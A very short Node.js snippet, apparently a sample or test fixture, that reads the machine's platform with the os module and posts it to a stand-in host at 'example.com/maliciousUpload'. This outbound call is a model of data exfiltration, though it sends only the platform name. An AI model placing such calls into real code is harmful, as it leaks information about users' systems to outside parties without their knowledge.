const os = require('os')

const platform = os.platform()
console.log('Platform:', platform)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { platform }
  }
)
